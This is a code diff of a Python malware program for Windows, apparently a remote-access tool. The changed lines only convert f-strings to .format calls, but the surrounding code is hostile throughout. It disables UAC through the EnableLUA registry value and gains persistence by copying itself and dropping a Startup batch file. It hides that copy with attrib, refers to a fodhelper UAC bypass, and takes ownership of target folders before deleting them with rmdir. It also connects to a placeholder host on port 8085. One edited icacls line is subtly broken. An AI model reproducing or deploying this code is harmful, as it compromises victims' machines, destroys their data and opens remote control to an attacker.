@@ -54,8 +54,8 @@ def LUA_OFF()->None:
     key = OpenKeyEx(HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\\Policies\\System", 0, KEY_WRITE)
     SetValueEx(key,"EnableLUA",0,REG_DWORD,0)
     CloseKey(key)
-    copyfile(argv[0],rf"C:\Users\{environ["username"]}\Documents\\"+basename(argv[0]))
-    with open(rf"C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat","w")as file:
+    copyfile(argv[0],r"C:\Users\{}\Documents\\".format(environ["username"])+basename(argv[0]))
+    with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ["username"]),"w")as file:
         file.write("""@Echo off
 start C:\\Users\\{0}\\Documents\\{1}
 exit""".format(environ["username"],basename(argv[0])))
@@ -80,14 +80,14 @@ def fodhelper(target:str=argv[0])->None:
         process_is_exists(basename(target))
 def CYS()->None:
     copyfile(argv[0],(r"C:\Users\{}\Documents\\"+basename(argv[0])).format(environ["username"]))
-    with open(rf"C:\Users\{environ["username"]}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat", "w") as file:
+    with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ["username"]), "w") as file:
         file.write("""@Echo off
 start C:\\Users\\{0}\\Documents\\{1}
 exit""".format(environ["username"], basename(argv[0])))
     run("attrib +s +h +r C:\\Users\\"+environ["username"]+"\\Documents\\"+basename(argv[0]))
 def FDR(target:str)->None:
     run(f"takeown /D Y /R /F {target}")
-    run(f"icacls {target} /T /C /grant {environ["username"]}:(F,MA)")
+    run("icacls {target} /T /C /grant {}:(F,MA)".format(environ["username"]))
     run(f"rmdir /S /Q {target}")
 addr=("%s",8085)
 connect()
